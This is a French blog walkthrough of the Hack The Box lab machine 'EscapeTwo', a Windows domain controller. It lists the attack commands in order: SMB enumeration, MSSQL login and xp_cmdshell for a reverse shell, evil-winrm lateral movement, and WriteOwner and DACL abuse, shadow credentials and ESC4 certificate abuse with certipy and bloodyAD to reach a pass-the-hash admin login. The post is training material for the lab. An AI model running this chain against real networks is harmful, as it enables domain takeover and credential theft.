<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: EscapeTwo</title>
<meta name=description content="Platforme: Hack The Box Lien: EscapeTwo Niveau: Facile OS: Windows Nous disposons des informations d&amp;rsquo;identification pour le compte suivant: Username: rose …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-escapetwo/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: EscapeTwo"><meta property="og:description" content="Platforme: Hack The Box Lien: EscapeTwo Niveau: Facile OS: Windows Nous disposons des informations d&amp;rsquo;identification pour le compte suivant: Username: rose …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Administrator/EscapeTwo.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Administrator/EscapeTwo.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: EscapeTwo"><meta name=twitter:description content="Platforme: Hack The Box Lien: EscapeTwo Niveau: Facile OS: Windows Nous disposons des informations d&amp;rsquo;identification pour le compte suivant: Username: rose …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-escapetwo/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-escapetwo/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Administrator/EscapeTwo.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-escapetwo/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-escapetwo/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: EscapeTwo</h1><small role=doc-subtitle></small><p class=post-date>6 min read |
<span class=post-date>25 Mai 2025</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/EscapeTwo>EscapeTwo</a></li><li>Niveau: Facile</li><li>OS: Windows</li></ul><hr><blockquote><p>Nous disposons des informations d&rsquo;identification pour le compte suivant: <strong>Username:</strong> rose <strong>Password:</strong> KxEPkKe6R8su.</p></blockquote><p>EscapeTwo est un test d&rsquo;intrusion de type &ldquo;gray box&rdquo; ciblant un contrôleur de domaine Active Directory. À l&rsquo;aide des identifiants initiaux, nous découvrons un fichier contenant les identifiants de la base de données. Ceux-ci sont utilisés pour activer et exploiter <code>xp_cmdshell</code>, ce qui permet l&rsquo;exécution de commandes à distance et un accès initial au système.</p><p>L&rsquo;énumération post-exploitation révèle des identifiants supplémentaires stockés dans un fichier de configuration. Ils sont utilisés pour se déplacer latéralement vers un utilisateur du domaine. Grâce à Bloodhound, nous découvrons que le compte compromis possède les droits <code>WriteOwner</code> sur un compte de service. En exploitant cette erreur de configuration, nous prenons le contrôle du compte de service que nous utilisons pour exploiter la voie d&rsquo;attaque ESC4, ce qui nous donne un accès administratif complet.</p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>nmap -sC -sV -Pn -oA nmap/EscapeTwo {IP}
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2025-01-11 15:57 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.129.33.0
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.060s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>988</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE       VERSION
</span></span><span style=display:flex><span>53/tcp   open  domain        Simple DNS Plus
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#56b6c2>(</span>server time: 2025-01-11 21:58:09Z<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>DC01.sequel.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb
</span></span><span style=display:flex><span>| Not valid before: 2024-06-08T17:35:00
</span></span><span style=display:flex><span>|_Not valid after:  2025-06-08T17:35:00
</span></span><span style=display:flex><span>|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>445/tcp  open  microsoft-ds?
</span></span><span style=display:flex><span>464/tcp  open  kpasswd5?
</span></span><span style=display:flex><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>DC01.sequel.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb
</span></span><span style=display:flex><span>| Not valid before: 2024-06-08T17:35:00
</span></span><span style=display:flex><span>|_Not valid after:  2025-06-08T17:35:00
</span></span><span style=display:flex><span>|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>1433/tcp open  ms-sql-s      Microsoft SQL Server <span style=color:#d19a66>2019</span> 15.00.2000.00; RTM
</span></span><span style=display:flex><span>| ms-sql-info: 
</span></span><span style=display:flex><span>|   10.129.33.0:1433: 
</span></span><span style=display:flex><span>|     Version: 
</span></span><span style=display:flex><span>|       name: Microsoft SQL Server <span style=color:#d19a66>2019</span> RTM
</span></span><span style=display:flex><span>|       number: 15.00.2000.00
</span></span><span style=display:flex><span>|       Product: Microsoft SQL Server <span style=color:#d19a66>2019</span>
</span></span><span style=display:flex><span>|       Service pack level: RTM
</span></span><span style=display:flex><span>|       Post-SP patches applied: <span style=color:#e5c07b>false</span>
</span></span><span style=display:flex><span>|_    TCP port: <span style=color:#d19a66>1433</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>SSL_Self_Signed_Fallback
</span></span><span style=display:flex><span>| Not valid before: 2025-01-11T19:22:43
</span></span><span style=display:flex><span>|_Not valid after:  2055-01-11T19:22:43
</span></span><span style=display:flex><span>| ms-sql-ntlm-info: 
</span></span><span style=display:flex><span>|   10.129.33.0:1433: 
</span></span><span style=display:flex><span>|     Target_Name: SEQUEL
</span></span><span style=display:flex><span>|     NetBIOS_Domain_Name: SEQUEL
</span></span><span style=display:flex><span>|     NetBIOS_Computer_Name: DC01
</span></span><span style=display:flex><span>|     DNS_Domain_Name: sequel.htb
</span></span><span style=display:flex><span>|     DNS_Computer_Name: DC01.sequel.htb
</span></span><span style=display:flex><span>|     DNS_Tree_Name: sequel.htb
</span></span><span style=display:flex><span>|_    Product_Version: 10.0.17763
</span></span><span style=display:flex><span>|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>DC01.sequel.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb
</span></span><span style=display:flex><span>| Not valid before: 2024-06-08T17:35:00
</span></span><span style=display:flex><span>|_Not valid after:  2025-06-08T17:35:00
</span></span><span style=display:flex><span>|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>DC01.sequel.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb
</span></span><span style=display:flex><span>| Not valid before: 2024-06-08T17:35:00
</span></span><span style=display:flex><span>|_Not valid after:  2025-06-08T17:35:00
</span></span><span style=display:flex><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2025-01-11T21:58:50
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 92.32 seconds
</span></span></code></pre></div><p>La cible est un contrôleur de domaine Active Directory avec les services habituels tels que LDAP, SMB, en plus de Microsoft SQL.</p><p>Nous avons également quelques noms de domaine que nous ajoutons au fichier <code>/etc/hosts</code>.</p><pre tabindex=0><code>sudo echo &#34;TARGET_IP sequel.htb DC01.sequel.htb DC01&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumération>Enumération</h2><p>Nous utilisons les identifiants fournis pour énumérer les partages disponibles.</p><pre tabindex=0><code>netexec smb TARGET_IP -u rose -p &#39;KxEPkKe6R8su&#39; --shares
</code></pre><p><img src=/images/HTB-EscapeTwo/rose_smb.png alt="SMB shares enumeration"></p><p>Nous avons accès à certaines partages, examinons le dossier <code>Accounting Department</code>. À l&rsquo;intérieur, nous trouvons deux fichiers que nous téléchargeons : <code>accounting_2024.xlsx</code> et <code>accounts.xlsx</code>.</p><pre tabindex=0><code>smbclient //sequel.htb/&#39;Accounting Department&#39; -U rose
</code></pre><p><img src=/images/HTB-EscapeTwo/acc_dpt_share.png alt="acct dept share access"></p><p>À l&rsquo;intérieur de <code>accounts.xlsx</code> nous trouvons plusieurs fichiers.</p><p><img src=/images/HTB-EscapeTwo/creds_file.png alt="accounts.xlsx file"></p><p>Nous pouvons lire le fichier <code>sharedStrings.xml</code> où se trouvent les identifiants du compte <code>sa</code>.</p><blockquote><p>Le compte <code>sa</code>, ou compte administrateur système, est un compte intégré à SQL Server qui donne à l&rsquo;utilisateur un accès administratif complet à l&rsquo;instance SQL Server.</p></blockquote><p><img src=/images/HTB-EscapeTwo/sa_creds.png alt="sa account credentials"></p><p>À l&rsquo;aide de la commande ci-dessous, nous nous connectons à la base de données.</p><pre tabindex=0><code>impacket-mssqlclient &#39;sequel.htb/sa:MSSQLP@ssw0rd!@sequel.htb&#39;
</code></pre><p><img src=/images/HTB-EscapeTwo/mssql_login.png alt="mssql login"></p><h2 id=accès-initial>Accès Initial</h2><p>Nous activons <code>xp_cmdshell</code> à l&rsquo;aide des requêtes suivantes.</p><blockquote><p><code>xp_cmdshell</code> est une fonctionnalité puissante de Microsoft SQL Server qui permet d&rsquo;exécuter des commandes du système d&rsquo;exploitation directement à partir de SQL Server.</p></blockquote><pre tabindex=0><code>EXEC sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE;
EXEC sp_configure &#39;xp_cmdshell&#39;, 1; RECONFIGURE;
</code></pre><p><img src=/images/HTB-EscapeTwo/xp_cmdshell_enabled.png alt="enable xp_cmdshell"></p><p>Nous testons avec <code>EXEC xp_cmdshell 'whoami';</code>.</p><p><img src=/images/HTB-EscapeTwo/xp_cmdshell_test.png alt="xp_cmdshell test"></p><p>Nous exploitons mssql pour obtenir un shell inversé. Sur <a href=https://www.revshells.com/>revshells</a> nous utilisons <code>PowerShell #3 (Base64)</code>.</p><pre tabindex=0><code>xp_cmdshell REVERSE_SHELL_COMMAND
</code></pre><p><img src=/images/HTB-EscapeTwo/mssql_revshell.png alt="mssql reverse shell"></p><p>Sur notre listener, nous obtenons une connexion sous le nom <code>sql_svc</code>.</p><p><img src=/images/HTB-EscapeTwo/foothold.png alt=foothold></p><h3 id=shell-en-tant-que-ryan>Shell en tant que ryan</h3><p>Nous observons l&rsquo;utilisateur <code>ryan</code> en plus de <code>Administrator</code>.</p><p><img src=/images/HTB-EscapeTwo/users_list.png alt="users list"></p><p>Dans <code>C:\SQL2019\ExpressAdv_ENU</code>, nous trouvons <code>sql-Configuration.INI</code> contenant un autre mot de passe <code>WqSZAF6CysDQbGb3</code>.</p><p><img src=/images/HTB-EscapeTwo/sqlsvc_pwd.png alt="sql config password"></p><p>Grâce à ce mot de passe, nous pouvons nous connecter en tant que <code>ryan</code>.</p><pre tabindex=0><code>evil-winrm -i sequel.htb -u ryan -p &#39;WqSZAF6CysDQbGb3&#39;
</code></pre><p><img src=/images/HTB-EscapeTwo/ryan_login.png alt="ryan login"></p><p>Le drapeau utilisateur se trouve dans <code>C:\Users\ryan\Desktop</code>.</p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>Continuons l&rsquo;énumération avec BloodHound.</p><pre tabindex=0><code>bloodhound-python -c all -u ryan -p &#39;WqSZAF6CysDQbGb3&#39; -d sequel.htb -dc dc01.sequel.htb -ns 10.129.33.0
</code></pre><p><img src=/images/HTB-EscapeTwo/bloodhound.png alt="bloodhound enumeration"></p><pre tabindex=0><code>sudo neo4j start
bloodhound --no-sandbox
</code></pre><p>Ryan dispose de l&rsquo;autorisation <code>WriteOwner</code> sur <code>CA_SVC</code>, que nous pouvons utiliser pour prendre le contrôle du compte.</p><p><img src=/images/HTB-EscapeTwo/ryan_WriteOwner.png alt="ryan WriteOwner"></p><p><img src=/images/HTB-EscapeTwo/WriteOwner_help.png alt="WriteOwner help"></p><p>En vérifiant les informations du compte, nous apprenons que <code>ca_svc</code> fait partie du groupe <code>Cert Publishers</code>.</p><p><img src=/images/HTB-EscapeTwo/ca_svc_group.png alt="ca_svc account info"></p><p>Nous trouvons plus d&rsquo;informations sur ce groupe à la page de documentation Microsoft disponible <a href=https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups>ici</a>.</p><p><img src=/images/HTB-EscapeTwo/cert_publishers_group.png alt="cert publishers group info"></p><p>Notre exploitation se déroulera en deux étapes principales. Tout d&rsquo;abord, nous devons prendre le contrôle de <code>ca_svc</code>, ce que nous pouvons faire grâce à <code>WriteOwner</code>. La deuxième étape consiste à exploiter les services de certificats Active Directory (ADCS).</p><ol><li>Obtenir la propriété du compte <code>ca_svc</code>.</li></ol><pre tabindex=0><code>bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p &#39;WqSZAF6CysDQbGb3&#39; set owner ca_svc ryan
</code></pre><p><img src=/images/HTB-EscapeTwo/bloodyAD.png alt=bloodyAD></p><ol start=2><li>Accorder à <code>ryan</code> le contrôle total sur <code>ca_svc</code>.</li></ol><blockquote><p>Vous pouvez télécharger <code>dacledit.py</code> <a href=https://github.com/fortra/impacket/blob/master/examples/dacledit.py>ici</a>.</p></blockquote><pre tabindex=0><code>python3 dacledit.py -action &#39;write&#39; -rights &#39;FullControl&#39; -principal &#39;ryan&#39; -target &#39;ca_svc&#39; &#39;sequel.htb&#39;/&#39;ryan&#39;:&#39;WqSZAF6CysDQbGb3&#39;
</code></pre><p><img src=/images/HTB-EscapeTwo/dacledit.png alt=dacledit></p><ol start=3><li>Exploiter <code>ca_svc</code> via les Shadow Credentials. <em>Plus d&rsquo;informations <a href=https://i-tracing.com/fr/blog/configuration-dacl-attaque-shadow-credentials/>ici</a>.</em></li></ol><pre tabindex=0><code>certipy-ad shadow auto -u ryan@sequel.htb -p &#39;WqSZAF6CysDQbGb3&#39; -dc-ip {ip} -ns {ip} -target dc01.sequel.htb -account ca_svc
</code></pre><p><img src=/images/HTB-EscapeTwo/certipy_shadow.png alt="shadow credentials exploit"></p><ol start=4><li>Énumérer les modèles de certificats vulnérables.</li></ol><pre tabindex=0><code>KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip {ip} -vulnerable -stdout
</code></pre><p><img src=/images/HTB-EscapeTwo/vulnerable_template.png alt="certificate enumeration"></p><p><img src=/images/HTB-EscapeTwo/Template_Name.png alt="template name"></p><p><img src=/images/HTB-EscapeTwo/ESC4.png alt=ESC4></p><ol start=5><li>Abuser du modèle de certificat vulnérable.</li></ol><pre tabindex=0><code>KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip {ip}
</code></pre><p><img src=/images/HTB-EscapeTwo/Template_Abuse.png alt="Template Abuse"></p><ol start=6><li>Demander un certificat pour l&rsquo;administrateur.</li></ol><pre tabindex=0><code>certipy-ad req -u ca_svc -hashes {ca_svc_hash} -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip {ip} -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns {ip} -dns {ip}
</code></pre><p><img src=/images/HTB-EscapeTwo/certificate_request.png alt="certificate request"></p><ol start=7><li>S&rsquo;authentifier en tant qu&rsquo;administrateur à l&rsquo;aide du certificat.</li></ol><pre tabindex=0><code>certipy-ad auth -pfx ./administrator.pfx -dc-ip {ip}
</code></pre><p><img src=/images/HTB-EscapeTwo/Admin_hash.png alt="Admin hash"></p><ol start=8><li>Connectez-vous en tant qu&rsquo;administrateur.</li></ol><pre tabindex=0><code>evil-winrm -i dc01.sequel.htb -u administrator -H {admin_hash}
</code></pre><p><img src=/images/HTB-EscapeTwo/root_flag.png alt="Admin login"></p><p>Merci d&rsquo;avoir lu cet article! Si vous souhaitez en savoir plus sur l&rsquo;attaque ESC4 et comment l&rsquo;exploiter, consultez <a href=https://www.vaadata.com/blog/fr/securite-ad-cs-comprendre-et-exploiter-les-techniques-esc/#aioseo-esc4-un-grand-pouvoir-implique-de-grandes-responsabilites>cet article</a>.</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-administrator/>&#8592;
Précédent:
HTB: Administrator</a></p><p class=prev-post-date>avril 20, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès Initial</a><ul><li><a href=#shell-en-tant-que-ryan>Shell en tant que ryan</a></li></ul></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2025 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>